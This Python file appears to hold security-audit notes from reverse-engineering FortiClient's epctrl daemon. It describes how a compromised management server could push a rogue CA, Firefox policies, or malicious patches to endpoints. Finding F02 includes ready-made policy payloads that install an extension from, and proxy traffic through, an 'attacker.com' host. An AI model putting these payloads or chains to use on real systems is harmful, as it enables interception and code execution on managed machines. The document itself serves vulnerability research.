"""
FortiClient epctrl (endpoint control) daemon RE
Source: forticlient-standalone-deb/opt/forticlient/epctrl (C/C++, 15.4MB stripped ELF64)
Only present in the FULL FortiClient package; NOT in the VPN-only package.
Method: strings analysis, gRPC proto references, filesystem path analysis
"""

# ---------------------------------------------------------
# epctrl architecture
# ---------------------------------------------------------
EPCTRL_ARCH = {
    "id":       "EPCTRL-ARCH",
    "product":  "epctrl -- FortiClient endpoint control enforcement daemon (C/C++, 15.4MB stripped ELF64)",
    "binary":   "/opt/forticlient/epctrl",
    "package":  "FULL FortiClient only (not present in VPN-only package)",

    "role": (
        "epctrl is the endpoint compliance enforcement daemon. "
        "It enforces EMS (FortiClient Enterprise Management Server) policy on the endpoint: "
        "  1. Runs vulnerability scans and applies patches (auto_patch). "
        "  2. Installs CA certificates into the system trust store. "
        "  3. Configures browser security policies (Firefox policies.json). "
        "  4. Enforces endpoint compliance (antivirus, patch level, firewall state). "
        "  5. Communicates with the firewall daemon to quarantine non-compliant endpoints. "
        "  6. Supports epctrl_on_fabric (Zero Trust Network Access enforcement on fabric)."
    ),

    "enforcement_actions": {
        "firewall.Firewall.EditZtnaRule":       "Modifies ZTNA interception rules",
        "firewall.Firewall.Quarantine.Action":  "Quarantines non-compliant host at network level",
        "firewall.Firewall.SetupBlockIpv6":     "Blocks IPv6 connectivity",
        "firewall.Firewall.SetupWebfilter":     "Pushes web filter rules",
        "firewall.Firewall.RefreshSimpleDNS":   "Refreshes DNS redirect rules",
        "firewall.Firewall.SetupSimpleDNS":     "Configures DNS redirect rules",
    },

    "ca_cert_paths": [
        "/usr/sbin/update-ca-certificates",     "Debian/Ubuntu: update system CA trust store",
        "/usr/local/share/ca-certificates/",    "System CA certificate directory",
        "/etc/pki/ca-trust/source/anchors/",    "RHEL/CentOS: CA trust anchor directory",
    ],

    "browser_policy_paths": [
        "/etc/firefox/policies/policies.json",   "System-wide Firefox browser policy",
        "/usr/lib/firefox/distribution/",        "Firefox distribution policy directory",
        "/usr/lib64/firefox/distribution/",      "Firefox distribution policy (64-bit)",
    ],

    "compliance_features": {
        "antivirus.schedu":         "Scheduled AV scan enforcement",
        "auto_patch/level":         "Automatic patch level enforcement",
        "block_ipv6":               "IPv6 enforcement (block if non-compliant)",
        "block_removable_media":    "Removable media enforcement",
        "block_malicious_websites": "Web filter enforcement",
        "epctrl.protobuf.EndpointLicense": "Endpoint license state management",
    },

    "posture_checks": {
        "Beginning host check (hv chksum: %s)": "Host integrity check with hash",
        "A vulnerability scan result has been logged": "Vulnerability scan logging",
        "Applying patch for vulnerability found": "Automated patch application",
        "Attempting to start an already started fabric checker": "Fabric posture checker state machine",
    },

    "ipc":  "Accepted pipe<%u> on socket<%u) from %s -- same shared NNG IPC as other daemons",
    "cli":  "-a --auth: trigger authentication flow with EMS",
}


# ---------------------------------------------------------
# EPCTRL-F01: EMS-pushed CA certificate system trust store injection
# ---------------------------------------------------------
EPCTRL_F01_CA_INSTALL = {
    "id":       "EPCTRL-F01",
    "product":  "epctrl -- EMS can push CA certificates installed into Linux system trust store",
    "severity": "CRITICAL -- compromised EMS pushes rogue CA -> system-wide HTTPS MITM on endpoint",
    "class":    "Unauthorized CA certificate installation (CWE-295, CWE-347)",
    "evidence": [
        "path: '/usr/sbin/update-ca-certificates' (invoked by epctrl to install CAs)",
        "path: '/etc/pki/ca-trust/source/anchors/' (RHEL CA trust anchor directory)",
        "path: '/usr/local/share/ca-certificates/' (Debian CA directory)",
        "config: forticlient_configuration_t.system_t.certificates_t.ca_t (CA config schema)",
    ],

    "mechanism": (
        "epctrl receives CA certificate configuration from EMS (via confighandler IPC). "
        "It copies certificates to the system CA directories and calls update-ca-certificates "
        "to register them in the system trust store. "
        "All applications that use the system trust store (curl, wget, apt, pip, npm, browsers, etc.) "
        "will trust any certificate signed by the EMS-pushed CA. "
        "This is an intentional feature for deploying corporate root CAs; the attack surface is "
        "the trust chain from the endpoint to EMS."
    ),

    "attack_chain": (
        "Step 1: Compromise EMS server (FortiClient Enterprise Management Server). "
        "         Attack vectors: CVE against EMS web UI, stolen EMS admin credentials, or "
        "         rogue EMS via DNS/IP spoofing if the EMS_FINGERPRINT is bypassable. "
        "Step 2: Push a malicious CA certificate to all enrolled FortiClient endpoints. "
        "Step 3: epctrl installs the rogue CA into /etc/pki/ca-trust/source/anchors/. "
        "Step 4: update-ca-certificates runs -> rogue CA is now trusted by ALL applications. "
        "Step 5: Attacker MITM any HTTPS connection from the endpoint (curl, apt, pip, npm, etc.). "
        "         Package managers using HTTPS now accept malicious packages signed by the rogue CA. "
        "Step 6: Wait for system update (apt upgrade) -> MITM delivers malicious package -> "
        "         code execution on the endpoint with package installer privileges. "
        "Fleet impact: if EMS manages 10,000 endpoints, all endpoints receive the rogue CA simultaneously."
    ),

    "see_also": [
        "CONFIGHANDLER-F01: pkcs11_lib injection via confighandler",
        "FCTDNS-F01: ZTNA CA used for TLS inspection",
        "CERTD-F01: certd software TPM fallback exposes CA key",
    ],
}


# ---------------------------------------------------------
# EPCTRL-F02: Firefox browser policy injection via EMS
# ---------------------------------------------------------
EPCTRL_F02_FIREFOX_POLICY = {
    "id":       "EPCTRL-F02",
    "product":  "epctrl -- EMS can write Firefox browser policy, disabling security features or installing extensions",
    "severity": "HIGH -- browser policy injection disables Firefox security or installs attacker extensions",
    "class":    "Unauthorized modification of browser security policy (CWE-693, CWE-284)",
    "evidence": [
        "path: '/etc/firefox/policies/policies.json'",
        "path: '/usr/lib/firefox/distribution/'",
        "path: '/usr/lib64/firefox/distribution/'",
    ],

    "mechanism": (
        "epctrl writes Firefox enterprise policy files in JSON format. "
        "Firefox enterprise policies can: "
        "  1. Install browser extensions (Extensions.Install: [url_to_xpi]) "
        "     -> attacker pushes malicious extension that monitors all web activity. "
        "  2. Disable certificate error pages (Certificates: ImportEnterpriseRoots: true) "
        "     -> combined with EPCTRL-F01 (rogue CA), removes the browser's last defense. "
        "  3. Configure a proxy server (Proxy settings) "
        "     -> all browser traffic routed through attacker-controlled proxy. "
        "  4. Disable safe browsing, disable updates, add allowed exceptions for malicious sites. "
        "A compromised EMS (same attack vector as EPCTRL-F01) pushes Firefox policies to all endpoints. "
        "Result: all employees' Firefox browsers are reconfigured to trust the rogue CA, "
        "route traffic through the attacker's proxy, and run a malicious extension."
    ),

    "firefox_policy_attack": {
        "disable_tls_errors": '{"policies":{"Certificates":{"ImportEnterpriseRoots":true}}}',
        "install_extension": '{"policies":{"Extensions":{"Install":["https://attacker.com/evil.xpi"]}}}',
        "set_proxy": '{"policies":{"Proxy":{"Mode":"manual","HTTPProxy":"attacker.com:8080"}}}',
    },
}


# ---------------------------------------------------------
# EPCTRL-F03: patch application with attacker-controlled parameters
# ---------------------------------------------------------
EPCTRL_F03_PATCH_APPLY = {
    "id":       "EPCTRL-F03",
    "product":  "epctrl -- automated patch application ('Applying patch for vulnerability found') with EMS-controlled parameters",
    "severity": "CRITICAL -- EMS-controlled patch source = code execution with epctrl privileges (likely root)",
    "class":    "Insecure automated patch mechanism (CWE-494); privilege escalation via patch injection",
    "evidence": [
        "string: 'Applying patch for vulnerability found'",
        "string: 'A vulnerability scan result has been logged'",
        "string: 'auto_patch'",
        "string: 'auto_patch/level'",
        "string: 'autopatch'",
    ],

    "mechanism": (
        "epctrl performs vulnerability scanning and applies patches automatically based on "
        "EMS-configured auto_patch/level settings. "
        "The patch application flow: "
        "  1. Vulnerability scan identifies a missing OS/application patch. "
        "  2. 'Applying patch for vulnerability found' -- epctrl fetches and applies the patch. "
        "  3. Patch fetch URL: likely from FortiGuard CDN or EMS-configured patch server. "
        "  4. Patch application: likely calls package manager (apt/yum) or system binary. "
        "Attack vector 1 (MITM on patch download): "
        "  - If patch URL is not certificate-pinned, MITM on the download channel. "
        "  - Attacker returns malicious package signed with rogue CA (EPCTRL-F01). "
        "  - epctrl installs the malicious package with root privileges. "
        "Attack vector 2 (EMS-controlled patch source): "
        "  - Compromised EMS configures a malicious patch server URL. "
        "  - epctrl downloads and executes from attacker's server. "
        "  - Fleet-wide code execution with epctrl/root privileges on all enrolled endpoints."
    ),

    "combined_chain": (
        "Combined exploitation: "
        "  EPCTRL-F01 (rogue CA install) + EPCTRL-F03 (patch download MITM) + UPDATE-F01 (curl 8.7.1): "
        "  Rogue CA installed by EPCTRL-F01 enables MITM on the patch download TLS channel. "
        "  epctrl downloads the patch over HTTPS; MITM intercepts using rogue CA for cert. "
        "  Malicious patch executed with root privileges. "
        "  Three findings chain to a single exploit step."
    ),
}


# ---------------------------------------------------------
# EPCTRL-F04: host integrity check with hash -- bypass via hash collision
# ---------------------------------------------------------
EPCTRL_F04_HOST_CHECK = {
    "id":       "EPCTRL-F04",
    "product":  "epctrl -- host integrity check uses checksum ('hv chksum: %s'); hash algorithm not confirmed",
    "severity": "MEDIUM -- if MD5/SHA1 is used for host integrity, hash collision bypasses compliance check",
    "class":    "Weak cryptographic hash in security check (CWE-328)",
    "evidence": [
        "string: 'Beginning host check (hv chksum: %s)'",
    ],

    "description": (
        "epctrl performs a host verification checksum ('hv chksum') as part of its host integrity check. "
        "The checksum is logged in the format 'Beginning host check (hv chksum: %s)'. "
        "The hash algorithm used is not confirmed from static analysis. "
        "If MD5 or SHA1 is used: "
        "  1. An attacker who can influence the files being hashed can craft a collision "
        "     that produces the same hash as a known-good system state. "
        "  2. This allows a compromised endpoint to appear compliant to EMS, "
        "     bypassing quarantine enforcement (EPCTRL-ARCH quarantine action). "
        "  3. The endpoint avoids ZTNA access restriction while remaining compromised."
    ),
}
